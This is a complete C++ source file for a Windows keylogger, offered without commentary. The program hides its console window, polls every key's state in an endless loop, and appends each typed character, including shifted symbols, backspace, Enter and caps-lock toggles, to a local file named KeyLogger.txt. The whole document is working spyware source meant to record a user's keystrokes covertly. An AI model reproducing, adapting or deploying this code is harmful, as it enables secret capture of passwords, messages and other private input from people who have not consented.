#include<iostream>
#include<windows.h>
#include<fstream>
#define DELAY 100

using namespace std;

bool caps_lock = false;

void key(int k);

int main()
{
    bool press = false;
    
    FreeConsole(); //HIDE CONSOLE
    while(true)
    {
        for(int i=8; i<222; i++)
        {
            if(GetAsyncKeyState(i) != press)
            {
                key(i);
                Sleep(DELAY);
            }
        }
    }
}

void key(int k)
{
    ofstream file("KeyLogger.txt", ios::app);
    switch(k)
    {
        case 48:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "=";
            else
                file << "0";
        break;

        case 49:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "!";
            else
                file << "1";
        break;

        case 50:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "''";
            else
                file << "2";
        break;

        case 51:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "£";
            else
                file << "3";
        break;

        case 52:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file <<  "$";
            else
                file << "4";
        break;

        case 53:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "%";
            else
                file << "5";
        break;

        case 54:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "&";
            else
                file << "6";
        break;

        case 55:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "/";
            else
                file << "7";
        break;

        case 56:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "(";
            else
                file << "8";
        break;

        case 57:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << ")";
            else
                file << "9";
        break;

        /*********************
            END OF NUMBER
        **********************/

        case 65:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "A";
            else
                file << "a";
        break;

        case 66:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "B";
            else
                file << "b";
        break;

        case 67:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "C";
            else
                file << "c";
        break;

        case 68:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "D";
            else
                file << "d";
        break;

        case 69:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "E";
            else
                file << "e";
        break;

        case 70:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "F";
            else
                file << "f";
        break;

        case 71:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "G";
            else
                file << "g";
        break;

        case 72:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "H";
            else
                file << "h";
        break;

        case 73:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "I";
            else
                file << "i";
        break;

        case 74:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "J";
            else
                file << "j";
        break;

        case 75:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "K";
            else
                file << "k";
        break;

        case 76:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "L";
            else
                file << "l";
        break;

        case 77:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "M";
            else
                file << "m";
        break;

        case 78:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "N";
            else
                file << "n";
        break;

        case 79:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "O";
            else
                file << "o";
        break;

        case 80:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "P";
            else
                file << "p";
        break;

        case 81:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "Q";
            else
                file << "q";
        break;

        case 82:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "R";
            else
                file << "r";
        break;

        case 83:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "S";
            else
                file << "s";
        break;

        case 84:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "T";
            else
                file << "t";
        break;

        case 85:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "U";
            else
                file << "u";
        break;

        case 86:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "V";
            else
                file << "v";
        break;

        case 87:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "W";
            else
                file << "w";
        break;

        case 88:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "X";
            else
                file << "x";
        break;

        case 89:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "Y";
            else
                file << "y";
        break;

        case 90:
            if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "Z";
            else
                file << "z";
        break;

        /************************
            END OF ALPHABET
        *************************/

        case 8:
            file << "[BACK]";
        break;

        case 13:
            file <<"\n";
        break;

        case 20:
            if(caps_lock == false)
            {
                file << "[CAPS LOCK]";
                caps_lock = true;
            }else
            {
                file << "[/CAPS LOCK]";
                caps_lock = false;
            }
        break;

        case 219:
            if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
                file << "?";
            else
                file << "'";
        break;

        case VK_TAB:
            file << "   ";
        break;
        
        case VK_SPACE:
            file << " ";
        break;

        case VK_MULTIPLY:
            file << "*";
        break;

        case VK_ADD:
            file << "+";
        break;

        case VK_SUBTRACT:
            file << "-";
        break;

        case VK_DIVIDE:
            file << "/";
        break;
    }
    file.close();
}
